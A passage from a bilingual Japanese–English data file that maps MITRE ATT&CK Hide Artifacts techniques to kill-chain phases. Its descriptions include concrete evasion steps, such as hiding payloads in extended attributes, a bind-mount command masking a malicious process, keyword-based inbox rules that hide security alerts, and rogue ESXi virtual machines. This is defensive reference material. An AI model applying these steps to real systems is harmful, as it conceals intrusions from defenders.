攻撃者はこれらの除外を悪用して、ファイルベースのアーティファクトを隠す可能性があります。例えば、新しい除外を追加するためにツール設定を改ざんする（つまり、[ツールの無効化または変更](https://attack.mitre.org/techniques/T1562/001)）のではなく、攻撃者はデフォルトまたはその他のよく知られた除外にファイルベースのペイロードをドロップする可能性があります。攻撃者はまた、[セキュリティソフトウェアの発見](https://attack.mitre.org/techniques/T1518/001)やその他の[発見](https://attack.mitre.org/tactics/TA0007)/[偵察](https://attack.mitre.org/tactics/TA0043)活動を利用して、被害者環境内の既存の除外を発見および検証する可能性があります。","Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)

Adversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.014,拡張属性,Extended Attributes,"攻撃者は、macOSおよびLinuxの拡張属性（xattrs）を悪用して、検出を回避するために悪意のあるデータを隠す可能性があります。拡張属性は、macOSとLinuxの両方で使用されるファイルおよびディレクトリメタデータのキーと値のペアです。これらは`Finder`、`ls`、`cat`などの標準ツールでは表示されず、検査には`xattr`（macOS）や`getfattr`（Linux）などのユーティリティが必要です。オペレーティングシステムとアプリケーションは、タグ付け、整合性チェック、およびアクセス制御にxattrsを使用します。Linuxでは、xattrsは`user.`（ユーザー権限）、`trusted.`（ルート権限）、`security.`、および`system.`などの名前空間に編成され、それぞれに特定の権限があります。macOSでは、xattrsは名前空間プレフィックスのないフラットな文字列であり、一般的に`com.apple.*`（例：`com.apple.quarantine`、`com.apple.metadata:_kMDItemUserTags`）で始まり、GatekeeperやSpotlightなどのシステム機能で使用されます。(引用: Establishing persistence using extended attributes on Linux)

攻撃者は、正当なファイルの拡張属性にセカンドステージペイロードを埋め込むことにより、xattrsを利用する可能性があります。macOSでは、`xattr`コマンドを使用してペイロードをカスタム属性に埋め込むことができます。別のローダーが`xattr -p`で属性を取得し、コンテンツをデコードして、スクリプトインタプリタを使用して実行できます。Linuxでは、攻撃者は`setfattr`を使用して、正当なファイルの`user.`名前空間にペイロードを書き込む可能性があります。ローダースクリプトは、後で`getfattr --only-values`でペイロードを抽出し、デコードして、bashまたは別のインタプリタを使用して実行できます。どちらの場合も、プライマリファイルコンテンツは変更されないため、拡張属性を検査しないセキュリティツールと整合性チェックは元のファイルハッシュを監視し、悪意のあるペイロードが検出を回避できるようにします。(引用: Low GroupIB xattrs nov 2024)","Adversaries may abuse extended attributes (xattrs) on macOS and Linux to hide their malicious data in order to evade detection. Extended attributes are key-value pairs of file and directory metadata used by both macOS and Linux. They are not visible through standard tools like `Finder`,  `ls`, or `cat` and require utilities such as `xattr` (macOS) or `getfattr` (Linux) for inspection. Operating systems and applications use xattrs for tagging, integrity checks, and access control. On Linux, xattrs are organized into namespaces such as `user.` (user permissions), `trusted.` (root permissions), `security.`, and `system.`, each with specific permissions. On macOS, xattrs are flat strings without namespace prefixes, commonly prefixed with `com.apple.*` (e.g., `com.apple.quarantine`, `com.apple.metadata:_kMDItemUserTags`) and used by system features like Gatekeeper and Spotlight.(Citation: Establishing persistence using extended attributes on Linux)

An adversary may leverage xattrs by embedding a second-stage payload into the extended attribute of a legitimate file. On macOS, a payload can be embedded into a custom attribute using the `xattr` command. A separate loader can retrieve the attribute with `xattr -p`, decode the content, and execute it using a scripting interpreter. On Linux, an adversary may use `setfattr` to write a payload into the `user.` namespace of a legitimate file. A loader script can later extract the payload with `getfattr --only-values`, decode it, and execute it using bash or another interpreter. In both cases, because the primary file content remains unchanged, security tools and integrity checks that do not inspect extended attributes will observe the original file hash, allowing the malicious payload to evade detection.(Citation: Low GroupIB xattrs nov 2024)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.008,メール隠蔽ルール,Email Hiding Rules,"攻撃者はメールルールを使用して、侵害されたユーザーのメールボックス内の受信メールを隠す可能性があります。多くのメールクライアントでは、ユーザーはメールを他のフォルダに移動したり、メールを既読にしたり、メールを削除したりするなど、さまざまなメール機能の受信トレイ ルールを作成できます。ルールは、メールクライアント内または、Windowsシステムの<code>New-InboxRule</code>や<code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドレットなどの外部機能を介して作成または変更できます。(引用: Microsoft Inbox Rules)(引用: MacOS Email Rules)(引用: Microsoft New-InboxRule)(引用: Microsoft Set-InboxRule)

攻撃者は、侵害されたユーザーのメールボックス内のメールルールを利用して、メールを削除したり、目立たないフォルダに移動したりする可能性があります。攻撃者はこれを利用して、セキュリティアラート、C2通信、または侵害されたアカウントから送信された[内部スピアフィッシング](https://attack.mitre.org/techniques/T1534)メールへの応答を隠す可能性があります。

組織内の任意のユーザーまたは管理者（または有効な資格情報を持つ攻撃者）は、メールを自動的に移動または削除するルールを作成できる可能性があります。これらのルールは、メールの内容がユーザーまたは防御側によってすぐに確認された場合に検出を妨害/遅延させるために悪用される可能性があります。悪意のあるルールは通常、メッセージ本文や件名に含まれるキーワード（<code>malware</code>、<code>suspicious</code>、<code>phish</code>、<code>hack</code>など）に基づいてメールをフィルタリングします。(引用: Microsoft Cloud App Security)

一部の環境では、管理者は個々の受信トレイではなく組織全体で動作するメールルールを有効にできる場合があります。例えば、Microsoft Exchangeは、組織が受信するすべてのメールをユーザー指定の条件に対して評価し、それらの条件に準拠するメールに対してユーザー指定のアクションを実行するトランスポートルールをサポートしています。(引用: Microsoft Mail Flow Rules 2023) このような機能を悪用する攻撃者は、特定のトピック（内部セキュリティインシデント通知など）に関連するすべてのメールを自動的に変更または削除できる可能性があります。","Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)

Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.

Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)

In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.009,リソースフォーキング,Resource Forking,"攻撃者はリソースフォークを悪用して、検出を回避しセキュリティアプリケーションをバイパスするために、悪意のあるコードや実行可能ファイルを隠す可能性があります。リソースフォークは、アプリケーションがサムネイル画像、メニュー定義、アイコン、ダイアログボックス、コードなどのリソースを構造化された方法で保存する方法を提供します。(引用: macOS Hierarchical File System Overview) リソースフォークの使用は、<code>ls -l@</code>または<code>xattr -l</code>コマンドを使用してファイルの拡張属性を表示するときに識別できます。リソースフォークは非推奨となり、アプリケーションバンドル構造に置き換えられました。ローカライズされていないリソースはアプリケーションバンドルのトップレベルディレクトリに配置され、ローカライズされたリソースは<code>/Resources</code>フォルダに配置されます。(引用: Resource and Data Forks)(引用: ELC Extended Attributes)

攻撃者はリソースフォークを使用して、他の方法ではファイルに直接保存される可能性のある悪意のあるデータを隠すことができます。攻撃者は、実行可能な場所に移動されてから呼び出される、指定されたオフセットでリソースフォークがアタッチされたコンテンツを実行できます。リソースフォークのコンテンツは、実行されるまで難読化/暗号化されることもあります。(引用: sentinellabs resource named fork 2020)(引用: tau bundlore erika noerenberg 2020)","Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a file’s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes)

Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.013,バインドマウント,Bind Mounts,"攻撃者は、ファイル構造上のバインドマウントを悪用して、ネイティブユーティリティからアクティビティやアーティファクトを隠す可能性があります。バインドマウントは、Windowsのショートカットと同様に、ファイルシステム上のある場所から別の場所へディレクトリまたはファイルをマッピングします。これは、コンテナ内やchroot環境など、さまざまな環境間で特定のファイルやディレクトリへのアクセスを提供するために一般的に使用され、sudoアクセスが必要です。

攻撃者は、バインドマウントを使用して、空のディレクトリまたは良性の`/proc`ディレクトリを悪意のあるプロセスの`/proc`ディレクトリにマッピングする可能性があります。コマンド`mount –o bind /proc/benign-process /proc/malicious-process`（または`mount –B`）を使用すると、悪意のあるプロセスの`/proc`ディレクトリが良性のプロセスの`/proc`ディレクトリの内容で上書きされます。`ps`や`top`などのシステムユーティリティがプロセスアクティビティを照会すると、カーネルはバインドマウントをたどり、悪意のあるプロセスの実際の`/proc`ディレクトリの代わりに良性のディレクトリの内容を提示します。その結果、これらのユーティリティは良性のプロセスから来たように見える情報を表示し、悪意のあるプロセスのメタデータ、実行可能ファイル、またはその他のアーティファクトを効果的に検出から隠します。(引用: Cado Security Commando Cat 2024)(引用: Ahn Lab CoinMiner 2023)","Adversaries may abuse bind mounts on file structures to hide their activity and artifacts from native utilities. A bind mount maps a directory or file from one location on the filesystem to another, similar to a shortcut on Windows. It’s commonly used to provide access to specific files or directories across different environments, such as inside containers or chroot environments, and requires sudo access.

Adversaries may use bind mounts to map either an empty directory or a benign `/proc` directory to a malicious process’s `/proc` directory. Using the commands `mount –o bind /proc/benign-process /proc/malicious-process` (or `mount –B`), the malicious process's `/proc` directory is overlayed with the contents of a benign process's `/proc` directory. When system utilities query process activity, such as `ps` and `top`, the kernel follows the bind mount and presents the benign directory’s contents instead of the malicious process's actual `/proc` directory. As a result, these utilities display information that appears to come from the benign process, effectively hiding the malicious process's metadata, executable, or other artifacts from detection.(Citation: Cado Security Commando Cat 2024)(Citation: Ahn Lab CoinMiner 2023)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.006,仮想インスタンスの実行,Run Virtual Instance,"攻撃者は、検出を回避するために仮想インスタンスを使用して悪意のある操作を実行する可能性があります。コンピュータまたはコンピューティング環境のエミュレーションを可能にするさまざまな仮想化テクノロジが存在します。仮想インスタンス内で悪意のあるコードを実行することにより、攻撃者は仮想インスタンス内のアクティビティを監視できないセキュリティツールから、その行動に関連するアーティファクトを隠すことができます。(引用: CyberCX Akira Ransomware) さらに、仮想ネットワークの実装（ブリッジアダプターなど）によっては、IPアドレスとホスト名が既知の値と一致しない可能性があるため、仮想インスタンスによって生成されたネットワークトラフィックを侵害されたホストに追跡することが困難になる場合があります。(引用: SingHealth Breach Jan 2019)

攻撃者は、仮想化のネイティブサポート（Hyper-Vなど）を利用したり、仮想インスタンスの実行に必要なファイル（VirtualBoxバイナリなど）をドロップしたりする可能性があります。仮想インスタンスを実行した後、攻撃者はゲストとホストの間に共有フォルダを作成し、仮想インスタンスがホストファイルシステムと対話できるようにする権限を付与する可能性があります。(引用: Sophos Ragnar May 2020)

VMWare環境では、攻撃者はvCenterコンソールを利用して新しい仮想マシンを作成する可能性があります。ただし、`/bin/vmx`ユーティリティで有効な`.vmx`ファイルを実行することにより、ESXiサーバー上で直接仮想マシンを作成することもできます。このコマンドを`/etc/rc.local.d/local.sh`（つまり、[RCスクリプト](https://attack.mitre.org/techniques/T1037/004)）に追加すると、VMが永続的に再起動します。(引用: vNinja Rogue VMs 2024) このようにVMを作成すると、vCenterコンソールやESXiサーバー上の`vim-cmd vmsvc/getallvms`コマンドの出力に表示されなくなるため、通常の管理アクティビティから隠されます。(引用: MITRE VMware Abuse 2024)","Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance.(Citation: CyberCX Akira Ransomware) Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)

Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)

In VMWare environments, adversaries may leverage the vCenter console to create new virtual machines. However, they may also create virtual machines directly on ESXi servers by running a valid `.vmx` file with the `/bin/vmx` utility. Adding this command to `/etc/rc.local.d/local.sh` (i.e., [RC Scripts](https://attack.mitre.org/techniques/T1037/004)) will cause the VM to persistently restart.(Citation: vNinja Rogue VMs 2024) Creating a VM this way prevents it from appearing in the vCenter console or in the output to the `vim-cmd vmsvc/getallvms` command on the ESXi server, thereby hiding it from typical administrative activities.(Citation: MITRE VMware Abuse 2024)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

